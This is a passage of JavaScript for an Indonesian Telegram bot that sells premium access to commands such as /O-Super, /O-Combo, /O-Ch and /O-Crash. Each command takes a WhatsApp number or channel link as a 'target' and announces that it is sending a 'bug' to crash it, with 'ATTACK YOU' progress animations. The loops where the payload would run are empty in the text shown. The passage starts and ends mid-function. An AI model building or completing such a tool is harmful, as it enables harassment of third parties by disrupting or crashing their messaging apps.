  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;

const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 
  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
   
      for (let i = 0; i <= 70; i++){  
      
  }
  
  console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});  

bot.onText(/\/O-Super (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;


const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {
      
     }
    console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Combo (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {   
      
      }
  console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Ch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
 
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
const channelLink = match[1]?.trim();
  if (!channelLink) {
    return bot.sendMessage(
      chatId,
      "🚫 Masukin link grup yang bener!\nContoh: /O-Ch https://whatsapp.com/channel/xxxx"
    );
  }

  if (!/^https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+$/.test(channelLink)) {
    return bot.sendMessage(
      chatId,
      "🚫 Link channel salah!\nContoh: /O-Ch https://whatsapp.com/channel/xxxx"
    );
  }

  const channelCode = channelLink.split("https://whatsapp.com/channel/")[1];

  try {
    const link = channelLink;
    await bot.sendMessage(chatId, "⏳ Sedang Mengirim Pesan Ke Channel Whatsapp");     
    const channelJid = await getWhatsAppChannelInfo(link);
    const Jid = `${channelJid}@s.whatsapp.net`;
    const target = Jid;
    const mention = Jid;
    const isTarget = Jid;
 
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  


  
   const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: 'Markdown'
  });
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
♛ プロセス   : 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨 ✘
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝘦𝘴 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
  for (let i = 0; i <= 20; i++) {   
     
      }
  console.log(chalk.blue(`\n
━━━【𝕆𝕋𝔸𝕏】━━━
 ✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
♛ 状態 : 𝘚𝘶𝘥𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘉𝘰𝘴𝘬𝘶ूाीू....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
⋆━━━━━━━━━━━━━━━━━━༉‧`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${channelLink}
♛ タイムタン : ${new Date().toLocaleString()}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${channelLink}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Crash (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "𝙂𝙖𝙙𝙖 𝙎𝙚𝙣𝙙𝙚𝙧 𝘽𝙖𝙣𝙜ツ 𝙨𝙞𝙡𝙖𝙝𝙠𝙖𝙣 /𝙧𝙚𝙦𝙥𝙖𝙞𝙧 𝙩𝙚𝙧𝙡𝙚𝙗𝙞𝙝 𝙙𝙖𝙝𝙪𝙡𝙪✘"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

  
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
♛ 状態 : 𝘚𝘢𝘣𝘢𝘳 𝘔𝘢𝘴𝘪𝘩 𝘗𝘳𝘰𝘴𝚎𝚜 𝘠𝘢𝘬✘....
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    '▰▱▱▱▱▱▱▱▱▱ 10%',
    '▰▰▱▱▱▱▱▱▱▱ 20%',
    '▰▰▰▱▱▱▱▱▱▱ 30%',
    '▰▰▰▰▱▱▱▱▱▱ 40%',
    '▰▰▰▰▰▱▱▱▱▱ 50%',
    '▰▰▰▰▰▰▱▱▱▱ 60%',
    '▰▰▰▰▰▰▰▱▱▱ 70%',
    '▰▰▰▰▰▰▰▰▱▱ 80%',
    '▰▰▰▰▰▰▰▰▰▱ 90%',
    '▰▰▰▰▰▰▰▰▰▰ 100%'
  ];

  const texts = [
    '🧨 будьте готовы',
    '👻 мусухму терлихат',
    '🔒 аку дисини унтакму',
    '⚓ апаках каму судах сиап',
    '🤬 пеньеранган димулай',
    '🧠 не может быть',
    '💣 OTAX сиап меньеранг',
    '🌀 OTAX Рядом с тобой',
    '💥 как ты мой враг',
    '✅ Муснахлах пембенджику'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
✘ 𝙾𝚃𝙰𝚇 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ ターゲット : ${formattedNumber}
${frames[i]}
♛ ${texts[i]}
༒︎ •၊၊||၊|။||||။‌‌‌‌‌၊|• 𝙊𝙏𝘼𝙓
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
